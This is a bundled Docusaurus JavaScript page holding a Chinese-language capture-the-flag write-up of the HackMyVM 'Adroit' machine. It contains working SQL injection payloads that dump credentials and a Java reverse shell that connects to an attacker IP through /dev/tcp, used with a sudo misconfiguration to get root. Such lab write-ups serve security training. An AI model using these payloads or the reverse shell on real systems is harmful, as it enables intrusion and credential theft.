"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[6453],{41705:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>s,default:()=>d,frontMatter:()=>a,metadata:()=>o,toc:()=>p});var r=t(85893),i=t(11151);const a={},s="Adroit",o={id:"HackMyVM/Machines/Adroit/index",title:"Adroit",description:"[Linux VM] [Tested on VirtualBox] created by || alienum",source:"@site/docs/HackMyVM/Machines/Adroit/index.md",sourceDirName:"HackMyVM/Machines/Adroit",slug:"/HackMyVM/Machines/Adroit/",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Adroit/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Adroit/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackMyVM_Sidebar",previous:{title:"Machines",permalink:"/Target-Machines-WriteUp/docs/category/HackMyVM-Machines"},next:{title:"Alzheimer",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Alzheimer/"}},c={},p=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"ftp \u533f\u540d",id:"ftp-\u533f\u540d",level:2},{value:"Java \u53cd\u7f16\u8bd1",id:"java-\u53cd\u7f16\u8bd1",level:2},{value:"User - writer",id:"user---writer",level:2},{value:"flag - user",id:"flag---user",level:3},{value:"\u73af\u5883\u63a2\u6d4b",id:"\u73af\u5883\u63a2\u6d4b",level:3},{value:"User - root",id:"user---root",level:2},{value:"flag - root",id:"flag---root",level:3}];function l(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,i.a)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.h1,{id:"adroit",children:"Adroit"}),"\n",(0,r.jsxs)(n.admonition,{type:"note",children:[(0,r.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || alienum"}),(0,r.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2021-01-16"}),(0,r.jsx)(n.p,{children:"\u2714\ufe0f MD5 // ac9c736e31582644e86eeb4f832c1e4a"}),(0,r.jsx)(n.p,{children:"\u2620 Root // 23"}),(0,r.jsx)(n.p,{children:"\ud83d\udc80 User // 24"}),(0,r.jsx)(n.p,{children:"\ud83d\udcddNotes //\nCreated and Tested in Virtual Box Suggested tools : jd-gui, eclipse IDE Hint: one 0 is not 0 is O"})]}),"\n",(0,r.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,r.jsx)(n.p,{children:"\u9776\u673a IP"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.117\n"})}),"\n",(0,r.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:'Nmap scan report for 192.168.56.117\nHost is up (0.00028s latency).\nNot shown: 65530 closed tcp ports (reset)\nPORT      STATE SERVICE VERSION\n21/tcp    open  ftp     vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_drwxr-xr-x    2 ftp      ftp          4096 Mar 19  2021 pub\n| ftp-syst:\n|   STAT:\n| FTP server status:\n|      Connected to ::ffff:192.168.56.102\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 3\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey:\n|   2048 d2:32:82:0f:82:48:cd:c2:33:a2:a2:72:09:c5:28:91 (RSA)\n|   256 4e:8a:9a:49:b9:23:c2:cd:ac:89:4f:44:b2:0b:0b:db (ECDSA)\n|_  256 32:88:82:fc:84:79:98:1d:b2:27:96:26:96:5a:68:6b (ED25519)\n3000/tcp  open  ppp?\n3306/tcp  open  mysql   MySQL (unauthorized)\n33060/tcp open  mysqlx?\n| fingerprint-strings:\n|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:\n|     Invalid message"\n|_    HY000\n'})}),"\n",(0,r.jsx)(n.h2,{id:"ftp-\u533f\u540d",children:"ftp \u533f\u540d"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"ftp> ls -lah\ndrwxr-xr-x    3 ftp      ftp          4096 Jan 14  2021 .\ndrwxr-xr-x    3 ftp      ftp          4096 Jan 14  2021 ..\ndrwxr-xr-x    2 ftp      ftp          4096 Mar 19  2021 pub\nftp> cd pub\nftp> ls -lah\ndrwxr-xr-x    2 ftp      ftp          4096 Mar 19  2021 .\ndrwxr-xr-x    3 ftp      ftp          4096 Jan 14  2021 ..\n-rw-r--r--    1 ftp      ftp          5451 Jan 14  2021 adroitclient.jar\n-rw-r--r--    1 ftp      ftp           229 Mar 19  2021 note.txt\n-rw-r--r--    1 ftp      ftp         36430 Jan 14  2021 structure.PNG\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5c06\u4e09\u4e2a\u6587\u4ef6\u4e0b\u8f7d\u4e0b\u6765\u8fdb\u884c\u5206\u6790"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="note.txt"',children:"Hi, i am a junior developer and i am pro with cyber security.\nAlso i am a writer and i created a java socket app to save my ideas.\nPS :\nif you break something the server will restart within a minute.\nAlso, one 0 is not 0 but O\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u67e5\u770b\u56fe\u50cf\u5185\u5bb9"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"structure.PNG",src:t(55950).Z+"",width:"831",height:"344"})}),"\n",(0,r.jsxs)(n.p,{children:["\u53ef\u4ee5\u6000\u7591\u53ef\u80fd\u8981\u901a\u8fc7 ",(0,r.jsx)(n.code,{children:"Adroit"})," \u53bb\u653b\u51fb ",(0,r.jsx)(n.code,{children:"MySQL"})," \u670d\u52a1"]}),"\n",(0,r.jsx)(n.h2,{id:"java-\u53cd\u7f16\u8bd1",children:"Java \u53cd\u7f16\u8bd1"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-java",metastring:'title="adroit.AdroitClient"',children:'package adroit;\n\nimport java.io.IOException;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.io.UnsupportedEncodingException;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\nimport java.rmi.NotBoundException;\nimport java.rmi.RemoteException;\nimport java.security.InvalidKeyException;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Scanner;\nimport javax.crypto.BadPaddingException;\nimport javax.crypto.IllegalBlockSizeException;\nimport javax.crypto.NoSuchPaddingException;\n\n/* loaded from: adroitclient.jar:adroit/AdroitClient.class */\npublic class AdroitClient {\n    private static final String secret = "Sup3rS3cur3Dr0it";\n    static ObjectOutputStream os;\n    static ObjectInputStream is;\n    static Socket socket;\n\n    public static void main(String[] args) throws InvalidKeyException, NoSuchPaddingException, NoSuchAlgorithmException, BadPaddingException, IllegalBlockSizeException, UnsupportedEncodingException, NotBoundException, ClassNotFoundException {\n        Cryptor crypt = new Cryptor();\n        try {\n            socket = new Socket("adroit.local", 3000);\n            os = new ObjectOutputStream(socket.getOutputStream());\n            is = new ObjectInputStream(socket.getInputStream());\n            R request = new R();\n            Scanner scanner = new Scanner(System.in);\n            System.out.println("Enter the username :");\n            String userName = crypt.encrypt(secret, scanner.nextLine());\n            System.out.println("Enter the password :");\n            String password = crypt.encrypt(secret, scanner.nextLine());\n            if (userName.equals(crypt.encrypt(secret, "zeus")) && password.equals(crypt.encrypt(secret, "god.thunder.olympus"))) {\n                request.setUsername(userName);\n                request.setPassword(password);\n                System.out.println("Options [ post | get] :");\n                String option = scanner.next();\n                scanner.nextLine();\n                if (option.toLowerCase().equals("post")) {\n                    request.setOption("post");\n                    System.out.println("Enter your phrase identifier :");\n                    String id = crypt.encrypt(secret, scanner.nextLine());\n                    System.out.println("Enter your phrase :");\n                    String phrase = crypt.encrypt(secret, scanner.nextLine());\n                    Idea idea = new Idea();\n                    idea.setId(id);\n                    idea.setPhrase(phrase);\n                    request.setIdea(idea);\n                    os.writeObject(request);\n                    R responseobj = (R) is.readObject();\n                    String response = responseobj.getOption();\n                    System.out.println(response);\n                } else if (option.toLowerCase().equals("get")) {\n                    request.setOption("get");\n                    System.out.println("Enter the phrase identifier :");\n                    String inp = scanner.nextLine();\n                    String id2 = crypt.encrypt(secret, inp);\n                    Idea idea2 = new Idea();\n                    idea2.setId(id2);\n                    request.setIdea(idea2);\n                    os.writeObject(request);\n                    R responseobj2 = (R) is.readObject();\n                    String response2 = responseobj2.getOption();\n                    System.out.println(response2);\n                } else {\n                    System.out.println("Bad option, valid options = get, post");\n                }\n            } else {\n                System.out.print("Wrong username or password");\n            }\n            scanner.close();\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n        } catch (RemoteException e2) {\n            System.out.println(e2.getMessage());\n            e2.printStackTrace();\n        } catch (IOException e3) {\n            e3.printStackTrace();\n        }\n    }\n}\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u53ef\u4ee5\u770b\u5230\uff0c\u7a0b\u5e8f\u5bf9 ",(0,r.jsx)(n.code,{children:"adroit.local"})," \u8fd9\u4e2a\u57df\u540d\u7684 3000 \u7aef\u53e3\u5efa\u7acb\u4e86 Socket \u8fde\u63a5\uff0c\u7591\u4f3c\u662f\u81ea\u884c\u5b9e\u73b0\u4e86\u4e00\u5957\u52a0\u5bc6\u7684 HTTP \u8bbf\u95ee\uff0c\u6000\u7591\u8fd9\u4e2a\u7a0b\u5e8f\u5c31\u662f ",(0,r.jsx)(n.code,{children:"AdroitClient"})]}),"\n",(0,r.jsx)(n.p,{children:"\u6839\u636e\u540e\u7eed\u7684\u4ee3\u7801\u4fe1\u606f\uff0c\u53ef\u4ee5\u5f97\u5230\u4ee5\u4e0b\u5185\u5bb9"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-java",children:'private static final String secret = "Sup3rS3cur3Dr0it";\nuserName.equals(crypt.encrypt(secret, "zeus"))\npassword.equals(crypt.encrypt(secret, "god.thunder.olympus"))\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u5c1d\u8bd5\u5728\u672c\u5730\u5efa\u7acb\u89e3\u6790\u8bb0\u5f55"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="/etc/hosts"',children:"192.168.56.117 adroit.local\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u7136\u540e\u8fd0\u884c\u7a0b\u5e8f"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~/tmp]\n\u2514\u2500\u2500\u257c $ java -jar adroitclient.jar\nEnter the username :\nzeus\nEnter the password :\ngod.thunder.olympus\nOptions [post | get] :\nget\nEnter the phrase identifier :\n1 or 1 = 1\n haxor test\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u6000\u7591\u53ef\u80fd\u5b58\u5728\u8fc7\u6ee4\u5668\uff0c\u5c1d\u8bd5\u5176\u4ed6 payload"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"1 union select 1,database() -- -\n--\x3e adroit\n1 union select 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema ='adroit' -- -\n--\x3e  ideas,users\n1 union select 1,group_concat(column_name) from information_schema.columns where table_name ='users' -- -\n--\x3e id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS\n1 union select 1,group_concat(username,0x3a,password) from users -- -\n--\x3e writer:l4A+n+p+xSxDcYCl0mgxKr015+OEC3aOfdrWafSqwpY=\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u4f46\u662f\u5f97\u5230\u7684\u5bc6\u7801\u8fd8\u662f\u5904\u4e8e\u52a0\u5bc6\u7684\u72b6\u6001\uff0c\u5c1d\u8bd5\u89e3\u5bc6"}),"\n",(0,r.jsxs)(n.admonition,{type:"warning",children:[(0,r.jsx)(n.p,{children:"\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u4e0a\u6587\u5728 ftp \u670d\u52a1\u5668\u7684\u63d0\u793a"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"Also, one 0 is not 0 but O\n"})})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-java",children:'import java.io.UnsupportedEncodingException;\nimport java.security.InvalidKeyException;\nimport java.security.NoSuchAlgorithmException;\n\nimport javax.crypto.BadPaddingException;\nimport javax.crypto.IllegalBlockSizeException;\nimport javax.crypto.NoSuchPaddingException;\n\npublic class Cryptor {\n    private String secret;\n\n    public String getSecret() {\n        return this.secret;\n    }\n\n    public void setSecret(String secret) {\n        this.secret = secret;\n    }\n\n    public String encrypt(String key, String text) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, BadPaddingException, IllegalBlockSizeException, UnsupportedEncodingException {\n        Key aesKey = new SecretKeySpec(key.getBytes(), "AES");\n        Cipher cipher = Cipher.getInstance("AES");\n        cipher.init(1, aesKey);\n        byte[] encrypted = cipher.doFinal(text.getBytes());\n        return Base64.getEncoder().encodeToString(encrypted);\n    }\n\n    public String decrypt(String key, String text) throws NoSuchPaddingException, NoSuchAlgorithmException, BadPaddingException, IllegalBlockSizeException {\n        try {\n            Key aesKey = new SecretKeySpec(key.getBytes(), "AES");\n            Cipher cipher = Cipher.getInstance("AES");\n            cipher.init(2, aesKey);\n            String decrypted = new String(cipher.doFinal(Base64.getDecoder().decode(text)));\n            return decrypted;\n        } catch (InvalidKeyException e) {\n            System.out.println("[x] Invalid key length {16 required}");\n            return null;\n        }\n    }\n}\n\npublic class Main {\n\n    public static void main(String[] args) throws InvalidKeyException, NoSuchPaddingException, NoSuchAlgorithmException, BadPaddingException, IllegalBlockSizeException, UnsupportedEncodingException {\n\n        Cryptor cryptor = new Cryptor();\n        String password = cryptor.decrypt("Sup3rS3cur3Dr0it", "l4A+n+p+xSxDcYCl0mgxKrO15+OEC3aOfdrWafSqwpY=");\n        System.out.println(password);\n\n    }\n\n}\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u5f97\u5230\u7684\u5bc6\u7801\u4e3a ",(0,r.jsx)(n.code,{children:"just.write.my.ideas"})]}),"\n",(0,r.jsx)(n.p,{children:"\u7ec4\u5408\u8d77\u6765\u5c31\u662f\u4e00\u7ec4\u51ed\u636e"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"writer:just.write.my.ideas\n"})}),"\n",(0,r.jsx)(n.h2,{id:"user---writer",children:"User - writer"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~/tmp]\n\u2514\u2500\u2500\u257c $ pwncat-cs writer@192.168.56.117\n[23:16:04] Welcome to pwncat \ud83d\udc08!\nPassword: *******************\n[23:16:10] 192.168.56.117:22: normalizing shell path\n           192.168.56.117:22: registered new host w/ db\n(local) pwncat$ back\n(remote) writer@adroit:/home/writer$ whoami\nwriter\n"})}),"\n",(0,r.jsx)(n.h3,{id:"flag---user",children:"flag - user"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"(remote) writer@adroit:/home/writer$ cat user.txt\n61de3a25161dcb2b88b5119457690c3c\n"})}),"\n",(0,r.jsx)(n.h3,{id:"\u73af\u5883\u63a2\u6d4b",children:"\u73af\u5883\u63a2\u6d4b"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo -l"',children:"Matching Defaults entries for writer on adroit:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser writer may run the following commands on adroit:\n    (root) /usr/bin/java -jar /tmp/testingmyapp.jar\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u7531\u4e8e ",(0,r.jsx)(n.code,{children:"/tmp/testingmyapp.jar"})," \u6587\u4ef6\u662f\u4e0d\u5b58\u5728\u7684\uff0c\u4e8e\u662f\u53ef\u4ee5\u90e8\u7f72\u6076\u610f\u8d1f\u8f7d"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-java",metastring:'title="/tmp/shell.java"',children:'public class shell {\n    public static void main(String[] args) {\n        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "$@| bash -i>& /dev/tcp/192.168.56.102/6666 0>&1")\n            .redirectErrorStream(true);\n        try {\n            Process p = pb.start();\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}\n'})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="Manifest.txt"',children:"Main-Class: shell\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u8fdb\u884c\u7f16\u8bd1"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"(remote) writer@adroit:/tmp$ javac shell.java\n(remote) writer@adroit:/tmp$ jar cfm Shell.jar Manifest.txt shell.class\n(remote) writer@adroit:/tmp$ mv Shell.jar /tmp/testingmyapp.jar\n"})}),"\n",(0,r.jsx)(n.h2,{id:"user---root",children:"User - root"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"# (remote) writer@adroit:/tmp$ sudo /usr/bin/java -jar /tmp/testingmyapp.jar\n\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ pwncat-cs -lp 6666\n[23:34:13] Welcome to pwncat \ud83d\udc08!\n[23:37:27] received connection from 192.168.56.117:54654\n[23:37:27] 192.168.56.117:54654: registered new host w/ db\n(local) pwncat$ back\n(remote) root@adroit:/tmp# whoami\nroot\n"})}),"\n",(0,r.jsx)(n.h3,{id:"flag---root",children:"flag - root"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"(remote) root@adroit:/root# cat root.txt\n017a030885f25af277dd891d0f151845\n"})})]})}function d(e={}){const{wrapper:n}={...(0,i.a)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(l,{...e})}):l(e)}},55950:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/images/image_20240253-225356-3c3ed22e89750e6d57eb924d4c8d56da.png"},11151:(e,n,t)=>{t.d(n,{Z:()=>o,a:()=>s});var r=t(67294);const i={},a=r.createContext(i);function s(e){const n=r.useContext(a);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:s(e.components),r.createElement(a.Provider,{value:n},e.children)}}}]);